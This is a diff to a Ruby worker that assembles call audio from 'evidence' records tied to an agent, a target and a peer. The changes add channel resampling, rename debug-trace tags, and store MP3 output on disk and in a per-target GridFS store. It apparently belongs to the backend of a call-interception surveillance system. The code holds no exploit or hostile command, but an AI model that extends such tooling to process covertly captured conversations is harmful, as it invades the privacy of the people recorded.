@@ -4,13 +4,15 @@ module Worker
 require 'ffi'
 require 'mongo'
 require 'mongoid'
+require 'stringio'
+require 'digest/md5'
+
 require 'rcs-common/trace'
+
 require_relative 'speex'
 require_relative 'wave'
 require_relative 'src'
 require_relative 'mp3lame'
-
-require 'digest/md5'
 
 class AudioProcessingError < StandardError
   attr_reader :msg
@@ -33,9 +35,11 @@ class Channel
     @sample_rate = evidence[:data][:sample_rate]
     @start_time = evidence[:data][:start_time]
     @last_stop_time = @start_time
+    @needs_resampling = @sample_rate
+    @resampled = false
     @wav_data = Array.new # array of 32 bit float samples
     @status = :open
-    trace :debug, "[#{@id}] CREATING NEW CHANNEL #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
+    trace :debug, "[CHAN #{@id}] CREATING NEW CHANNEL #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
   end
   
   def id
@@ -48,62 +52,73 @@ class Channel
   
   def close!
     @status = :closed
-    trace :debug, "[#{@id}] closing channel #{self.id}"
+    trace :debug, "[CHAN #{@id}] closing channel #{self.id}"
   end
   
   def closed?
     @status == :closed
   end
+
+  def resampled?
+    @resampled
+  end
+
+  def needs_resampling?
+    @needs_resampling != @sample_rate
+  end
+
+  def resample_channel(sample_rate)
+    trace :debug, "[CHAN #{@id}] resampling channel from #{@sample_rate} to #{sample_rate}"
+    unless sample_rate == @sample_rate
+      resampler = SRC::Resampler.new sample_rate
+      @wav_data = resampler.resample_channel @wav_data, @sample_rate
+    end
+    @needs_resampling = sample_rate
+    @resampled = true
+  end
+
+  def resample(evidence)
+    return evidence if @needs_resampling == @sample_rate
+    trace :debug, "[CHAN #{@id}] resampling wav from #{@sample_rate} to #{@needs_resampling}"
+    resampler = SRC::Resampler.new @needs_resampling
+    evidence[:wav] = resampler.resample_channel evidence[:wav], @sample_rate
+  end
   
   def fill(gap)
     samples_to_fill = @sample_rate * gap
-    trace :debug, "[#{@id}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
+    trace :debug, "[CHAN #{@id}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
     @wav_data.concat [0.0] * samples_to_fill.ceil
   end
   
   def time_gap(evidence)
     gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
-    trace :debug, "[#{@id}]#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
-    trace :fatal, "[#{@id}] *** NEGATIVE GAP ***" if gap < 0
+    trace :debug, "[CHAN #{@id}]#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
+    trace :fatal, "[CHAN #{@id}] *** NEGATIVE GAP ***" if gap < 0
     gap
   end
   
   def accept?(evidence)
     if closed? 
-      trace :debug, "[#{@id}] CHANNEL IS CLOSED, REFUSING ..."
+      trace :debug, "[CHAN #{@id}] CHANNEL IS CLOSED, REFUSING ..."
       return false
     end
     if time_gap(evidence) >= 5.0
-      trace :debug, "[#{@id}] TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
+      trace :debug, "[CHAN #{@id}] TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
       return false
     end
     return true
   end
   
   def feed(evidence)
-    #trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
-    
     gap = time_gap(evidence)
     fill gap unless gap == 0
     
     @last_stop_time = evidence[:data][:stop_time]
-    trace :debug, "[#{@id}] NEW STOP TIME #{@last_stop_time}"
-    @wav_data.concat evidence[:wav].unpack 'F*' # 16 bit samples
+    @wav_data.concat evidence[:wav]
+    trace :debug, "[CHAN #{@id}] #{num_frames} frames, NEW STOP TIME #{@last_stop_time}"
   end
-  
-  def resample(to_sample_rate)
-    SRC::new(SRC::SINC_MEDIUM_QUALITY, 1, nil)
-    src_data = SRC::DATA.new
-    src_data.end_of_input = 0
-    src_data.input_frames = 0
-    
-    data_in_buffer = FFI::MemoryPointer.new(:float, @wav_data.size)
-    data_in_string = @wav_data.pack('C*')
-    data_in_buffer.put_bytes(0, data_in_string, 0, data_in_string.size)
-    src_data.data_in = data_in_buffer
-  end
-  
-  def size
+
+  def num_frames
     @wav_data.size
   end
 
@@ -130,8 +145,7 @@ class Call
     @channels = {}
     @program = program
     @duration = 0
-    @resampled = :not_yet
-    trace :info, "[#{@id}] created new call for #{@peer}, starting at #{@start_time}"
+    trace :info, "[CALL #{@id}] created new call for #{@peer}, starting at #{@start_time}"
     @raw_ids = []
 
     @agent = agent
@@ -182,7 +196,7 @@ class Call
     # fill in later channel
     if a.size > 1
       fillin_gap = a[1].start_time - a[0].start_time
-      trace :debug, "[#{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
+      trace :debug, "[CALL #{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
       a[1].fill(fillin_gap)
     end
     
@@ -191,7 +205,7 @@ class Call
 
   def close!
     @channels.each_value {|c| c.close!}
-    trace :debug, "[#{@id}] closing call for #{@peer}, starting at #{@start_time}"
+    trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
     @evidence.update_attributes("status" => :complete)
     true
   end
@@ -206,15 +220,17 @@ class Call
     @raw_ids << evidence[:db_id]
 
     # if evidence is empty or call is closed, refuse feeding
-    return false if evidence[:wav].bytesize == 0
+    return false if evidence[:wav].size == 0
     return false if closed?
     return close! if end_call? evidence
 
     # get the correct channel for the evidence
     channel = get_channel(evidence)
     #return false if channel.nil?
+
+    channel.resample evidence if channel.needs_resampling?
     
-    trace :debug, "[#{@id}] feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
+    trace :debug, "[CALL #{@id}] feeding #{evidence[:wav].size} frames at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
     channel.feed evidence
     
     # update status
@@ -222,24 +238,23 @@ class Call
     
     unless queueing?
       destination_sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate
-      higher_sample_rate_channel = (@channels.values.max_by {|c| c.sample_rate})
-      # downsample channel with higher sample rate
-      unless higher_sample_rate_channel.sample_rate == destination_sample_rate
-        trace :debug, "[#{@id}] RESAMPLING #{higher_sample_rate_channel.sample_rate} -> #{destination_sample_rate}"
-      end
 
-      # take channel with higher sample rate and resample accordingly            
+      # resample channels if necessary
+      @channels.values.each {|c| c.resample_channel(destination_sample_rate) unless c.resampled?}
+
+      # MP3Encoder will take care of resampling if necessary
       @encoder ||= ::MP3Encoder.new(2, destination_sample_rate)
       unless @encoder.nil?
         @encoder.feed(@channels[:outgoing].wav_data, @channels[:incoming].wav_data) do |mp3_bytes|
-          File.open("#{@id}.mp3", 'ab') {|f| f.write(mp3_bytes) }
+          File.open("#{file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
 
+          trace :debug, "[CALL #{@id}] pumping #{mp3_bytes.size} bytes of mp3 data into FILE"
           db = Mongoid.database
           fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")
-          data = ''
+
+          trace :debug, "[CALL #{@id}] pumping #{mp3_bytes.size} bytes of mp3 data into GRID"
           fs.open(file_name, 'a') do |f|
             f.write mp3_bytes
-
             @evidence.update_attributes("data._grid" => f.files_id)
             @evidence.update_attributes("data._grid_size" => f.file_length)
           end
@@ -275,7 +290,7 @@ class Call
   end
 
   def file_name
-    Digest::MD5.hexdigest "#{@peer}:#{@program}:#{@start_time}"
+    "#{@id}_#{@peer}_#{@program}"
   end
 
   def sample_rates
@@ -319,6 +334,7 @@ class CallProcessor
   
   def get_call(evidence)
     # if peer is unknown or evidence is empty, evidence is invalid, ignore it
+    #trace :debug, "EVIDENCE WAV NIL? #{evidence[:wav].nil?}"
     return nil if evidence[:data][:peer].empty? or evidence[:wav].empty?
     return create_call(evidence) if @call.nil? # first call
     return @call if @call.accept? evidence and not @call.closed?
